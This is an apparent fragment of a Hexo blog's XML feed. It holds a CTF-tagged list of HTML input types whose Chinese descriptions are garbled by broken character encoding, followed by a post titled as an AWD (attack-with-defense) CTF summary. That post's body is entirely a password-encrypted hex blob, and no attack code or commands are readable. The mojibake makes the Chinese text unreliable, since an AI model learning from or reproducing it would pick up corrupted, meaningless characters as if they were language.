<li><p>type&#x3D;â€passwordâ€: å¯†ç è¾“å…¥å­—æ®µï¼Œç”¨äºæ¥å—å¯†ç ï¼Œè¾“å…¥çš„å†…å®¹ä¼šè¢«éšè—ã€‚</p>
</li>
<li><p>type&#x3D;â€numberâ€: æ•°å­—è¾“å…¥å­—æ®µï¼Œç”¨äºæ¥å—æ•°å€¼è¾“å…¥ï¼Œå¯ä»¥åŒ…å«æ•°å­—å’Œç¬¦å·ï¼ˆå¦‚+ã€-ã€å°æ•°ç‚¹ç­‰ï¼‰ã€‚</p>
</li>
<li><p>type&#x3D;â€emailâ€: ç”¨äºæ¥å—ç”µå­é‚®ä»¶åœ°å€çš„è¾“å…¥å­—æ®µï¼Œå¯ä»¥éªŒè¯è¾“å…¥å†…å®¹æ˜¯å¦ç¬¦åˆç”µå­é‚®ä»¶åœ°å€çš„æ ¼å¼ã€‚</p>
</li>
<li><p>type&#x3D;â€urlâ€: ç”¨äºæ¥å—URLåœ°å€çš„è¾“å…¥å­—æ®µï¼Œå¯ä»¥éªŒè¯è¾“å…¥å†…å®¹æ˜¯å¦ç¬¦åˆURLçš„æ ¼å¼ã€‚</p>
</li>
<li><p>type&#x3D;â€telâ€: ç”¨äºæ¥å—ç”µè¯å·ç çš„è¾“å…¥å­—æ®µï¼Œå¯ä»¥éªŒè¯è¾“å…¥å†…å®¹æ˜¯å¦ç¬¦åˆç”µè¯å·ç çš„æ ¼å¼ã€‚</p>
</li>
<li><p>type&#x3D;â€dateâ€: ç”¨äºæ¥å—æ—¥æœŸçš„è¾“å…¥å­—æ®µï¼Œå¯ä»¥é€‰æ‹©æ—¥æœŸã€‚</p>
</li>
<li><p>type&#x3D;â€timeâ€: ç”¨äºæ¥å—æ—¶é—´çš„è¾“å…¥å­—æ®µï¼Œå¯ä»¥é€‰æ‹©æ—¶é—´ã€‚</p>
</li>
<li><p>type&#x3D;â€colorâ€: ç”¨äºæ¥å—é¢œè‰²çš„è¾“å…¥å­—æ®µï¼Œå¯ä»¥é€‰æ‹©é¢œè‰²ã€‚</p>
</li>
<li><p>type&#x3D;â€checkboxâ€: å¤é€‰æ¡†ï¼Œç”¨äºé€‰æ‹©ä¸€ä¸ªæˆ–å¤šä¸ªé€‰é¡¹ã€‚</p>
</li>
<li><p>type&#x3D;â€radioâ€: å•é€‰æŒ‰é’®ï¼Œç”¨äºåœ¨ä¸€ç»„é€‰é¡¹ä¸­é€‰æ‹©ä¸€ä¸ªã€‚</p>
</li>
<li><p>type&#x3D;â€fileâ€: æ–‡ä»¶ä¸Šä¼ å­—æ®µï¼Œç”¨äºé€‰æ‹©ä¸Šä¼ æ–‡ä»¶ã€‚</p>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>awdæ€»ç»“</title>
    <url>/2023/07/22/awd%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="312eecd9dd07406bc844d0fbbf178ee28f09f2a3d91c7c145a36a6d079da4b42">d36903d02fdab7def2f6fa58ca80dc601351859feb6b5e09288e8241713d6417d1cb79634665d905e2624256fae4f8f4dd624a0535eb16d24e519f4a988a217d9b9b7af41159969eabb4519a9cf1ff091caefe0e04664eb940f24f02541213de260d71b8852c91b20e591ecdd33d7b441b01b7cd70339aa14fa1fdae3c293d7780a038ec0848667cbdd8256c9b05e50828f1fd2ab35ee3a596693c032a7f94ec0cbd1d87a86d294497287849b67b8fe261ac6c825d74a375e40ae56700b2932bbd9fee9130ba7a5ca2931514c6ce4c6676eabd56a77d6148082c77a5dfb33399dc97858133854078fa1abeaf4327b5d7338872e5e7763ba4092bff652aab1a59c6204edb3e7adc93e4809954746eb8c660d7fe1e9a2be743916db8234d920a608ce578f46ae0f1431b542850ae583b25a1d61f66c49b44c36955e4543766687b9b84ac3a27e47c5a67528a7b847dfce2fdce3c8debc06c24e97ec2ab9aec7cb71cb8242d5cee38433dbfc929fdd0420b953843d187c73b49f5e0a6cbe0a41541ff8ce5bd1a331bb713b5bbce86da2325310e340382840dc8db8f6434c1c7222e405a16283f233b7ebeb4b59624b3a3f6f1cc6ceb9f37dfcfed7d0a08b56db1e6de6601651198f9c84604e55acade5b8ce4fe3c87ec1a8851216c8d55411453ed5325aa7c01f2c05ddee7930e0f83989f0f2f80c2aa2d80fcbbb2bae70215b8491ba82f6368597c74df39eab710d2331cef6ba5eca5fa928be073393028b5cc4556356d4a27e12f1a9d146434339107196c31c4a109765737fba1c69bc44b548daa904c8f78832eac3e3ce04162facf732c2fee3a5aec771baa8735a6095872eb3c933d4b6df8f930e97dd93a4a8d400e8e0809ded6c4b1161e7f29ee8db3296d95e0d3c18448dc5d08925eb5b1e3998d755883ebc2f1932569a537d13ebd2704272e8ccb5f0d5d6054810dcc8d6e4155729f40778cd6bed8a026d7c649f836171566e2bcb48cc085c520952afdf26a1ee5b71fcc4d3b653d03a372739e1169188f18145f4e2fbbecc204b446463a5eb123ab7229a0e034671b416196428a6c2a1063467f8faaf33dcdf3770f7e69a45c58c09c45ad74f9950675821e95aad3779d30751872b60113a036dcbea90ec2f0c042b382d524a2eb3d972084319a8b08525c3f9f1af5f5aa09604c7ff23fd59c9c660c2b33556016d0d52a96e29f80a973ce6d524faad0335e7b8984be6b44c7ca697b9c7b216ce6cbfe852270caec3ac0594fee28dfbe8d739c8fcad787f9cbf061d70fb1b942159c22c3890b8aefc773a7df77b64de3fe72dd0a9d9fe41b4a3716f3778758d42992e1177e02cb3a62818a9f062cf6ee63440a60575762b461ee431cafbdcbdcd01c67db41a6ea3119a437c99c8f28ec5c220dea8c28603342bf57c1a617db3007cefe0dcce217763a6a16aeed58e9df27e00403433f1356d6aa776397b6d9a58ed0b3db64da92fba452f17915c55591f77efe8733a9e8806e7844699356cf1e266ac010153b085fefa0b8da661c748b49e03cfe4e0b0072c036af575d744f44a01f6523f5e5b81b1d590b9b0a0e221ab4d5a15853e9ce47c9da23cfd9dd08726021ff147d2d31fcd27372c8d80e6409cbab1a020a3b859e9fe5f558517d092fa29933afa9e0395d8b89bfcb44b0bea88bf1c3eec3c9c087d92f15e3b53b60e13325b547bdfb9a32081bd95f8a95c20aa36896178ee8ef38db3b37600141d6b65e0bc96f3bae9b3e273f3160a70e72029afb593731a6143e101d9443d9db5f5cd128aad634d133a836e50c236c280c471ff6fb954048f769caecf3600cb8823fbdeeee5b3ec214b5d2fdd816b87fcb0dc8eb0d46c75c1daf301791294de321f4a79c094b5f852f6cff50d7fa84e572557c39f3ce22c13c69d69e808754cc68cecbfcdffa5372cd049606e0be5c0078d725c875963d8e99a900966bb34215949065ad5e02e6a334d5eedc4d9c2f5f9d6bdb7f1f5baac732856c82a0d23213c12cd484351b72b88beefc656d53f99e8459b90c6c996a6c3f65809f902b8da3557e73c829c59c67e86beb3840c8b2793b44d87cd7e49a242eee9143eee37964fbd2e12c69aceedf7d6196335c75be8af9a9e6e831ea004d450f771f4471cb1a925080e2fc5e8785132fb43d0e3bf57c765e1aa1fcee66155b1687e5831b361b19bf64be6ac5644f2f9de54cb2e304faef3f09acd35259d6704e3d3f2cb173ade9130c325ced6beb5567cc8b96d44fa64af86a8fc1e54358fbe13cbd2a2112a1122f8b1ba4c2d7a4be364ae258ab89675f19c449c532d40f6e1e966ada9ef753f42fa4b2516148f86939a6f0879b682bdbbb37ca1d7e4ec982f921b379b8978363f7d88cab43f46b3fd834f6ff9f21c2647def8990e707adcd51492cb4f2594250768d2c772259c5df48522bcf8af3e8fc25c87242ec0e2c7973724cf6fc445f14236cbd336ed1a104669ae7f97d3f8442d248403ee0d5b6d4338a68de8eb6c66094081c0cfc2e3c7a9ef13dabf8b1c9bd8ea45d67080a2a9874b77941c57c652e11a2bc78ef03767f7f52689442f20c0f853f0ec636b40145909f5debcfcc7c1ba9431cd02a1293dd2f9e2cb54fff3b4bafd2f2a43b6d740f2795657118d5c6a28d115acd012ecc9c0986c624c09e13059d0c3292d9ccb55530b86ff54e3c75d8c4ead7beee42587aa4017829a3cf335dd6d727f56ae13bc4deaadbc5eda61ed5bf816fd2806829d6e4dfc071b7407ce8f456a3110fae63880a56cb786f202c473cb0a6dc313e9019cad1511bcd3909797d53f101856bcd3c2bf810560d8f25f3911de8216dfebc70324e057cbb7c2a7c5ad6390f5b4a4f63cfa7ae544198df94d0a90cb633148888889fcee8c873ada6e1e697b527d368a7ec23ecaafbf6d4113f9257c313e2bdf06c854d5eb40992291c3b1b1e947a5dfc4a74f057ed6de17a189af64a0b6cf70fb5a8ef6029332051224eb851c0221815831423a1cb94b49be2899fcf8d9a7193d225b584f06bdb5130538cb7042baecb1dc65c295c7c07b015ba1a9eaf50242d6464e573c3cb078c2f58c49c51cfd74fda3aa01e8b198f0ddd227ecbf89ae7d9a70007df7f05ce65e78fae847b9c8d6d972bf22285ddb3e065eb67685e108a77a63a262234be4feaf1dc2e801fbee8dda43d8362544c09a81bae7dadbe0615f36fbcf5af7ed60f7f80c10f5a6d7428e214cab0b71874a4fc548bcc411db15e6f57bdd60d2eaf45e9ace61bba99f2fc276f4dad6eaa8269977726f3e6863314a5562eeb36989e0143fbf8489b7646919b5a8f8a372be89bc8bd77585b9f6a184a6539f6aa77e10e72108c207c4b0eb9fdd721864a67bccb943fe532482bf3574cd94469b507a3947a5aa4c3ad00d2ac22cf7155e4b7c7283c69bd9ce60c05e5d1c950b00005cd97c35d82ad94b2ebca01768338b0a86f43e9665a4c3861ef7cf477282b10a92ded6bf82542454fe9156dfedbdb9da42da7aae5cf082502fba46a3a63612e824326277810caa650e19c92c33d479ab6502c473786df2a1544361b12c5f285e6a0c00751565cfbed97a4e652ddddb3f98de446975bb4662d41e7d48ed0dfe466bf43036bf595d1d970c77652ec79ac2b21811253b2b90b4a131d7f2705cb83798f17446e77a4436c0e8dd6400fa114e81cbf142af4df911ed55e9a5bb04333064c10d15ca2e81ba049ac67a7a41460146f4965ef0c9f6ebee8ed8e60049cd6a5ca2244a1992d9d702cad7bea4c779dc8cb83dc11d103eaabe728f36f938d8792ae5d7cb2897c33d2356453ba33520ddbd68cd4cfc0c8733db5eb21fcb4b67a583db7a1f1132fad6d79ca611837804515c67d3d02e9ed16209da90afa9f009a3161df2dfd2b423248170c41f2d6582f67b11df7744a64cffff84f9a19af73273bd063a9ab5e85da4db36057951a6d05ee3456bc37ae4dbf6ee162486cbf32f0a61df1def92edbc8abbeaadae0b0e2e0ff3c0435401526619ee73596bf0d801da3cf704a4241f1b8daa544e00d4fa6e7585635cf7ee6c833a3be91cdae1326b3a55b3dc92747c49a8f389a45db278fe6e9b209cc19c911c823cc220be930de666046bc81856fc524361eea44e847ae4815e53a55a7758fb2c5df14440f7a24f43da5646845647df14532d52b145402cf7d60975d8d7e95ad2b64e6703b5dfba02bc078d3e9038e15181efab53df73551401aaf3499b9e4c40188b7cb40ab923bc70f86b9ae7eb17ab30f2ad55da5b1c193c5d63b9641186320aa8e4d34ceef46d5e0f1ddb2bdcf1a60b3edcd02b3d844c4f5832aae189f2ebc3fa9105e4123d812819c44a89d358480a05ef91fc77b11d579cfcec8069eb16a2536efb4d66b3780b839d6a956772fc70ef43fa428f34e891cb73162a12c34d5a2af7ec1d2ce8cc659374540183a09f5b07ec217e2deb6655cc88ea3c057a96174551c107fe94dabdf9de22a98754af2d22c77c0a7f4692feb90c302688283f6952c1db06e593244d3a3021cf04cdcca46ebb56935c3858ae512cb61704f3456c947ed78690f9f73ffeb6f9dbbf21500d3e14fd074246c0ebc43444783d5cc57a5aa30065917190c7b269447c3f89eea2cf011903f172df7b73f0ffbb72964897dace33900649f7d2d6ca8008ab4081db7ecd252bcdd88b7dc8f8075dd4a2d341f2e0aca3a9e643dbcf0919ffd078b6ac48da284459b8e1e6935f843c137c5490ef3ced18049189b6ab5ce911fc4fec269859e6aa491e08e9218bcc15d7a617bb46619fbc3d4e43d89bfc50afbfa84e7fc27fc9725c968dead54df1e9cda647f202272edd5bf0d378650a65fb049ef9196f963e39eab0c45cc4a5fc0f14255356c0c6ffeb70384d70cba350cd58242eade6a436c86bc63cbba5fd09268429ecc351444c7360388d5d1b85d9874c2cb4134757a3869893eba42fc9c03b8999da413ed81f183e8962ec836e085059ea36efcca1e6a273c2a4f1eacca0bf51e0f293b7791b0385700f92b3d51daccb32ed74f6b9051897fdfad9c97f14011f349cc73ae961b1f1e9122619cd3a744d63b51a68efef373d65dbfb6c67b230000b548cbbcd1e93a1235753253a11e2ebc462c84189dcdad76eb0288825b6edce5ec200c825ec79542efef4e5fb15c14a428a280b0a1705ee023481349bf0d0fc1c4f1ed3e3b4a5f43b7c2f72b6a0a11071433c8ff6350ebc94fcf1661419ab22752a08dd08a31f1d4f7f79512257220443e9795c53003b17ef847b6e297177bee8aed269e6ca87d398b034e98f7705ae363099c2e1e81e49db1b421c1d15da8fc1ec20810183be48df1ebe88c3f0db73526d38c4c9956408c8633d71351a63c9371d5512d1dd85b85e51b2a596e26a774dae71f0abda439a9684f904759900610f9b8446e276a760c763688ac70ed283ba13e0b5d00787f84d15c06f2f21ef8d2cc7d687d9d060df2bc8dcac093bc05df9f7d3f79b39129f6bf7f7d5dd941f9a109ce43387ce2178929d9e767af6252c9454586c8f9b6d026e289fd6512441211d0fa94f6e5bc7ce31d360a4cca113fdf87547627ef85103fbc5ee914fcb7ad81c466c44f838a2452f312f899a423b0c88a68ace5f3af1a4f10ae6d6c4023856612c52ef184a6b7cdfefa4572864d85c8730f1d317cff9379fc216c98ba98fc8d99e92ad369fe3a23607f7e75a8cbae7b23cd71cff252ca5f23c58a138560103d8b70e322225bcc0c1804c2886d0d1c414aacf50c83041d7de8c7de30a4edc1c7e8205adc35af646542b8667c1bd1d930b12b3c718b8d942ea60e28fe199b63d268e703990b510b3b77709e0833f235404e826bd908a0b8edb99a0c029840b8976565e47d0017a0aa6a9a210f059ac2d29e6df46845142b446d61932382d2dc8b281c6b357b83ecf76933f0b15bb3239df09190059df51efc5d25d930b12b2fb2d32ec49775545e3e885f76e4a5a4581660a649b8c889c4c9d34f683e83bf6094b6802f8c5fbbd3f8170cada91eeaac3643937d1057d454a567d1f16a42d217cf0ffc924c5bb85759404ade9f9fe7dde9fd9f4485c266d896acf1ab9d7b22a24ebd99f3be3a902aeac201fe65ab703ef225c5e3762831d8e882394dd2b8c24c10258229b8dc2bad8e447f4024176e8ec8c7be75bd090e3f0954288148cf8853157c0546ce9ef94dcce2ee7a711d669aa24c34fd6c01beeeb5c2d3695da1167394bf074978abaeca5cb5527c8b7aaba9787249891f6e8c2cb07981c450cbdca1a9b438a96418514fadbb31d01d853039907408883b2ca49e8b11049ea86878abb6bb3de61edf01b1bfb5e839ede8c7d96574a676eecd4094956ed91ef5aed144f47cbd54d086dbc0897f56ecc312b5e661e67841a2762a31638826e621a1e004e24f942cae3cffb8fdf21c980972607842f4c04b3751568dd740057e08a71f3b58b7494ae2c0044d66580165fb61a20d43c3c62da3e09adc65d329d136e30921ec7931ee3d2bccfbd3a06221367b21c90bca0f5596cb942258af79c7dab5ee6f760810b476993f98fa8d65d771987d29aeeff5d134aee476a8e16f967a8a7758213573e364bac07987195d95217c6ae10a02c84359b262d9c73a5a9c628bb3aff725fb111aa92e6e9ec76bb075e4b14171ab9d373d6d5681aa40d2c2cfea26872d93c95b68cf2bc4a05eea293aa4b9940d4390fe0162027c428e9b5584efb8464631465c6fc916696ad316b974b5c4e4e8b08ed1cd3dcbdbdc5f17b98d33df19df4e337184048f12020cecdfa83b12ea0a4de820ddca2902aa89b05038c184789f8f8bea4e7d9033ab0cb6d32e4860bb95a09bd7fb35d46fe930fcc37653d8e3340f4158694623f9dbf63139af1ac5eb82a152432bbb8a4199a757e559636186f0186accfe1477bf8700082ecaa63083b2b9afaacfd4be8611ed6e9170e183fc8beeb868b194396ee90a53edf2efbc64eae8eeefb127d4642e0bd6aa71a387494860f893b93747343a17c2ae923229d248ab516f432f27ed9647cb0c0fd3d57837de68eae26f51a403d42dbb1ee6531ebf5fb799e4188a1b1343280fd8b7ca3ed002a0317e5a62a53ae2609992d576586edfc63dbe0e0c7320604c166d6864a27fafeac63cfe7a96731541e3b0cba616d70e7a0e5eb310293bd2ed0b9e0fd915d36eebbcc99e9f3ca910aa9263dc13785a154e3f0f1569d6261749dc5106af307f14764e28bcca1802e409fb20d8ce0725d627117deec3b87aea5d091d3f4a4e897309bfd74c7eb6d2128e4a5943713690f6ea09dd643662381de9ef5af25f69dec6cbff3484a1938bf1098e94e5abab2ea31e5615da62b7e0f6363aa0651d9baf82869f38a8b46feb1962339610fc5deb01f70157fb106135df45ca70f3de087f7c8290468bcc8ce164d5a9419b4452507a0b13a094b01d2bfd4a2f055ffe44c54cd6a7a90efaf68f2360e233732a9f1ea048b2cb52bbd80e5c0ef0fca22e9040c31d57198dea3fe67fbf4a686c48695198ea43640ca71d89679d377635e96251679a89a289c061efe53c8d0c573fecb2649acade88298cc455656a2f0300f23d420b11d51dd7215c642615f8f854461f88c56797279627bba107f9ef0fb1f06aeafef44a14c28409f26ec34e3945782398fc74d5ee3cc535f02fc78cd56f51a04746a9388561daa053a3d89878caa81495b69eea57eafef9290e3e8d2dd7c8b3922a70dbd6d29fac2ac8fec6dfbf964b882e1501e3ba1e2177b62b14783fdde18cca7fc3fe932aaf658399f64dbbec24a9b0b7f0bd3c4b4d7c141c9095eb7b27fe4cdf840ef21c5910e205567dc69fc3157c2dc783a8c73ba6ab5f23a9edca7517b469060bbadd9fd3a7c761e7418c667de06a9f46c92d54e32f4cf557728fd58e566a50907360af6640d791147cab21ae4c960967daea1a9d84f887cff75318e8c262fddf0765243a0f6caa1db39d443d1e2d1a6475ccc7abdf4db3d761fd2219eb2704917ec01ce11d300ebdb3df240919b3865c35a1c2ce55cde3580af9668054152e835f1443386f72d809e7b0c47732a65d5c45640d8a66e81cf27587c10883f374f4c1dbbbff12855ae88f1f976f80aead040ed8484963b945c64f8f93efee6ef9612b0df72937273f880812657fcc22d9d6889fe8e3c7983165ecc95330541e7c365ec4d4a74e79ba5e4f9ef263974a5a9b32e0a00863b9fbccbb1673d3cded37a4ad6b495bfac8cec573dbbef7b0ea1412bde5a7ce9ce4f3b644028b0f541327a22d117b8739f82fe0ec4138d97c233ecf6313a8d012eff51512814f8132f70807304fd0b15b4cfe9c93191a2e57cc8ae110907c65864aa26a1d2bd0ee1081e3344b510529e8d7aaa59188c4f91106d59582740a75d2349c15ad8cba8b57299e54e3cd24b939d079667c1d6bed0408e7044f561b7ae2465576f75cf15b9c4f97195801b73d4411925c12363f0ab950a0d7885c34accdf5856c85c07b829e6304f06b06302963c5a16f08df65ea9f51fbeae9534e0c945b6ce643e4ca932f5ffda46e1002f16ff3e5fb61308a99c0d5150a98760cebb4bc5b537aa3b187c38023ee9a60bacbaef67f440a9d68ea2fdb892e09a49a76151c629610cddce183ad20cb417fe64fc8a6944a210841210b37e018d5eef03bd18bc1b48f69dc722497d7e8703290fe17b3341507723952ac17dd07647e74471d5486eb4fe51c9be5aefa600dbd71d9223ea227784025d2bf428a75db5645314607118986bc3b50d5c29cff201496e65152d2468c60f1540655062272475cf784de7c6b1b92a9fd05bed78d5e5fd13ce8f5c64a1aa6f966673e66e6735478f8f2827456f174094a2cfb7f90cfa54981c111c57fc3bcace2bd1fe3215ea8a63c73a13596250054e92313fa79804cfcb048b86ec213f6685d14ac92d98179e466fedd7ce8963aed76c19aebf520bf466a67bfe5ad5766511ac3c3bac51b75c03d8cf760ba4da183b5e589235ee888f19ab95743cc3d78b458039cb2f68cba00e62fe66d0ebe93a01db943ff5996e351887bb179280eb339e7ca1b903e1b9a67f25935eb58f77e85f901f882145a453e5a99138af2d41fada867b79d43753dce32c994ef14a73cdba6c8be24a8ee6411b7775abb2744dd17d4c2532e82e2c4812c808aac12ae1195f5e96880c6da570bb828d21826bad81155f941d0f136419f830f51bc89553029d1c68294c8b617edd4fe765574c3f90737542a9b9446d9bfb1a5cfd72d5ed639dbd8f382c1aa5c4c4282d5a72d24a7e9ec063b367f76aedd19e38a30dcce6d3d035b660593dfb58928af5bcb8a23508c884a84f109cff1a618700571e9950bb05899cf780ef28c95cefb253cdf2098a85cb18de0e742b7b77d966e42eaa2e95f79ee20e93de81b45e482425a2889694055456ab542b784e9f7512546dadc2d1fa957717298e9178c51c9c1b42fe75c8149f53afdb379d686a7fe23404ec2a80445ca011fb472f1c7709646710278412cbe959a250e58877aea163cbe988a1c35e5efe640a4fbe367958995a276685db1ab563ec4acc28a6c1e8632c862c2d352de4c6bee743362849b97abe3fd7498dd895d47f49928f84e69b971474f2818d93fad3ac73012afaef13e85e95ae74f0ee13dc4c2b2a10945b38cccea02abb6ad8b7301807d3b06550314f97e6cdf2791c7469bd7e340c2428d70719c42d644fe2faabe289eea98bec9adb6a17f0d4cec5e3a143ad8a3c010fa5c6c40d944cb7b400707095a416ca83ce7361751ed70c3b828d7f8e56acfccb2821ebf5f630c551de54cefd1ab12e879a0a66569d398084cdd41270a0729d4fdc668aee6ae812f23b37bdcffe0fcc5a1d9137397e41f55ad56a255fa2d07c82f40bb19585716f1032a4894c07479783d697e993e142629d952061d4d6c19edd8e93ef92d4c3097a82d06c7416599c22f51642f3f9f8bc94059185db1a10ea75f80394869a63a5c14c4b48d94c0aaba631d703ce5517011e92a9fb15c18aefbbe97dce52a082632af740bdd3021572d600e049b866a720ec159319936831e88d7e69099248d399f7611885fb264081a13d71b8019c6c79571d82f2dfa22b490e2864096feec49c946afaed7f31e0a37363ec9186649c993d75fde795ebc390f13defa3229632497b5f92d6b861693d7d4bdedbb638a663d13e413c75b5ca251bea80de2f9479c145083acd74ae9c79b9add773309c53df39ae1cdca8fed2e87e14322b332c92723509c1709689105531e0b6f27c818064a9116650cb106944bafc3f028d38c5c72cee27a2c8dcc55b94ffbbd3853e6c69f4f9b6177acd08bc02010bb4c409a31457fe5c10c5905c2da9ad33b47893c58fb6e0270313b8ea426e7a45598c2294b7d8f7d3ed60b0c31261a57efa3b1bd1a982584495306fa92e4563f7e1f81961e83ba0b6437b7085f161145f62bcbf8bb6a5f1f948ab3a37f8765300978bb77c81fcecf2833cff0eff1b92f2085509ad0d92e7e20e1734e292835e51a4db26f9539be16e6a26c4edf6ad92878641267bbe5e12592016b5f47e914f183d2a4519373df4e1333770fe4f85ab4a0355e3fc6c042b717d63d4d1474e8c36117501d5ec98efc92e5dd110b092433f55ad95110d5f7123f894c2784c95ac20c3e916db44ef10c95d0b92cdb1bdaecbefafede7cfcb29f2711e1e6171a50f2e2b96d0e2bd66a7018529abeb1be79299548f4c218900438496688da73024dd4e8601de9e851d3a1ab0dac4d25204abfb7c7d4777b96bd3f13ce625636cfafadb9b44394ccedabe166d3df1ec471d33af604ec9619958c97a8a0a8a7c99bc7bb9de7fce6111b47cb3f9508927047a0afd26b659fdebe9e857c5ab1a9c5dae94843054f84fd41621bc9785bd84f3f99090728ad52b68003826dbad71702171c1e5ae786d36d11545fc78dbf1e9f95335b191773964a43b1be208d7f353188c5d6177c1edba63a33ac1798800dca6fb76914d8f4b4e511f06f44b5a59f8f3f98afa797398cc3dbbf0b46392881a40356fd989a90d77029c1b85a03965206573ffbae166c0b3b8781c893d7c35bd0d83df8c2b9ea5c45b5589953d745db45bdd57d9c438f6011a6442d52baf1f7a4361617084d98a374dd9c6ed401dd06afb297cee41a9c9659cfc99ef353a2f95f30fcffc8397e7d5cbad4cf96dda002ddb704d2dec3bb31595922ebb84d844da22b717ddc9d0413ef7d34b61f99d02efdfe00da6998121149c081f898b1944020a408761fba3685ab949a815a35c4e6eb5854a1964199fce0fe036c7e3764f4eb03a39fe3414e9c70e4ea60d2d1b3e038a40a490297d740ea9d3df55159a43e3ffcfc46f4c810ca0830c5ac80ab1cd86808a40ae1962494355650eca61a79d6168b7b3ea8ddf470c268d4f632dd9eb74152221645a1b79b4d1bda6f9f486a3c5cfad0339ba53ef3cec70ffe227cdaf781a335dbb1eba8c97d31a92933878334783633f6b54a24170c77628a9f8590ca48a8b5f98b481365e96882bd1eb633c08008c1454a77e96b45ec19f382055ec20ed5a468836abd84cb9f45f8d07fccfc864bca40acce67e532864887cedacd149152c360c0a10bd6f044f0bfbc42829660a69b86da5ef121eaf8a4e6bc6e95ffdb4110c796081c21a55354383885daaf6a777d998e1944d019a0ca38a6737095975d4f68224e417123b5941a78d8d62937a05ab43df0d3dc952ac0781db7d3593b4bbb2a4f99cf714c1c8cc91c378d6e0eb0bde4bdc9427d8aaf61e299564acaaad01090230da09877a083564fe33947f919d3fc80612104cbd97a57eccb866efd9cf28e4d1618277e7bf361e615fafcbc7f99277935d1ad5891aa8e03b79058c5571c25f6c437ddbedbfbcb1f69c1f8ed5107aeead0be925c6e715bcd072e861e147fa1a6d401dc2074b4d8a0b8193a2fab05401dd88cb386531a0cddf472a43d023fc73b50be99b907ff185a39b046036a2aca0398a546452ef9b5ba635be1e49dc73eed52008a79eb1167e443fac7522eb9360520918ffeb7192f553522122f856a7177621fa9a7faf40d8334f1b348cab16f2c8386c46618661706abb537c063d1806f01a08001d4890d80c2a045edb9e3ff17ea18150537874f9ce0b495dd194f799ea92d6e5f3cf53778010143ce716ddebc8f5bfe4e44ff360ce98e38650be04c196d58e12a99e2a4e14939652c08a045a038e5a748c9cad0c378d08cc61d38cba997f7bb21eafdbc0c88d41765a5570719edca5ccfbef75ae82ad3ca07c4215565e59d78414b9b4e21ec337c9733dc5a6a27d799bcad88f85c12d7c78176a1f911e6413ea7b2f159b2ce70abe2f70e703fa87dcbe4e16e4f7748bd8039817a9684c8826b07ddb404d3657df8074dbcbed986232048c049b7e5cc90966f28a7d35a3a8ac0a5cb320799269a68a20c21b8eec9302b99a40dbe28d3642044fe61c87ef1c088789613a47c0fbf081047e4dffa907a9fb0ba7e7452baac897a2f9ae7430378a1d8953029abf22d4083d214061a09c1822782d5854c8dcc729b8310567b016780b876699d4b640db39595344e5f068908609d0fcc2d11f6a1e40a4a69d4b56b761bee3378438e7747010d58ca806e538064e210d81fd1d1e42774d9bc004af4367694890600cace038ea48fcdfa73601b18939091de1a60de1e0dc9d1e1badf0243f2d006b1504d0900b12f8e777bf253b26f4553b1598648c101d9e054686a354d201b80a6289c1983cad8de3f98fdc426eb0bebbe51e9701efc8b38aa5646f2b96fef7dc5c05e6442e95e49ea8165fccbae38fe84b4f59449a7248a6e45864b5a8f3a307eb8550939a3bd063e2e7ad9a835b64562b24e38d0ff4c291f572f77a15103ae27ed1c5c145f7c95352063f6cced82eaa67559fe1ca3403d221434cf5c24038522afb6ecd2b1aa23760a1f38592c9e1bc5f20756371a9e2283ca4f7033b973d457db7e069a10d1c5f7bae0b03375b93f68b9b2dce5c0a8b3bbe48f9b15cfc041be9de77a4b4fdfd07547e0e66fa3eb1935b5c1a886a4fe33da3f6c6c9c4f05f24027f551f0b2638890655ac59d57e027478539925bde893c2edc3ebc64b8d73a6a50522649365c8ba38fc15d61a6e485653c14d5ab476c95e04d8778dc6ca380a5735c3ddc71b26c2e9dc6e396a6a0167f7c93a395feeafaf392fb3fd352454de3458412bf227e671301b93c9c05ab82a4ca0ed1643ec28378295621fba6eb8a8f515f3623d077ba6cf6cdaa7c290d1f4e622027540847963330e2fd78f4fba4ec73a6bbdc0c927b34ab4861a8b43a92a22aedb67eedc0c7cab7e744e9a0d838cd727fe2bee5d18af01aad54c661077943545bdccd457059074f53b4c55ef0df99eae58ab305a131594b846e013515b40cfa0f7a9f2d51c31b13d4962febe96f2f646bf51606566db1529613f24913cb32d15b3d8f4450ad49d654f4a4247409e131eaa07a16e270eedd38dcd2ca720e8c7773ce5e18653654a2cec362c57473e57f17cde19eca20b4b2fb7014e5f1b17abe5e12701421608f83837f9b4a9927ac83844955657b43f06bc17c1957a105b0675c4d95d799435a87e22eddcd00c53d131c598d706143e7518d297975642b5addd2555d695fc0350d99a44a85446c8fa6bb5747255a53a3331963786831fee768d2d21ec3700cc90ab12328b6a5cc25ff4c897a65fb3a06ce06fed6585524914c1c6ad3cffb22cd6798626c3a7ec5df4d8be5335b14a72bdabe1aae5f988354458d98f645fc25edc9b045bfbb4a35ad67f4adfe9bcd09768ef13049a0c504f3a41e6af2eeef6e1b60a171941941698b117c0170e5f072d90bf21eb60b4a8d962a6a06ff7c2b879a93a4fa25e774363da917913f9481624155bb8225ed402c5aab3d4917a4490558d5bf63343effe59ab1bc1ac82f2c336700f81f4fe552747f68ab849502653e6f4e0a68638156707819923a7ecb780a57ad25c39438b95121de56c08e6ee4075eee53bb4e9a10ee9eeebe692e09b28303439962b37311837eb4f89e14ab306c81970ed337bebfc09a5bbdd5273dfde4b08cd0c175ba9c2f5b62074239a8343352e7dad66593945d6cdfcdd8cb4f3b76b6944d40c286d458928533cd9847d0bf440475e81f475af3846cc1b3482f2270edf963ba10d77fa14d7e176d7da3e6823d510c0c8d35c07be0ce0d7926878e6b640e1b44343e03ec256b9c4b239020e642a3fc1cd6e6d80112d2d5f552bcf59611d63ebcdac1d898e3ba19aef7d384d8a01ebde393c607e116cf5719fe8fd0d21736189eda21ecf21f17d32fde1d870222770a2ab2e33873fa44635a6dc6b34dde9e9765e8b88e49524a6c37b9c2cbeb7cfd5561cc15e4706a7aa570f811d9abe14de056d97a2cce6bec1f7e5aed281fead3898be2dc29491b6911043c467a4f7b41b7e40934008540e8d32da0631e64085ce7bef5d85247227552ef1ddb9c1f100f0eeb6ad413fd229acb15bdc13241c14aeb8e4b18f76be95b93559ac590511927ae0b46377e8502106f0838e8d4a0d28b8b4afa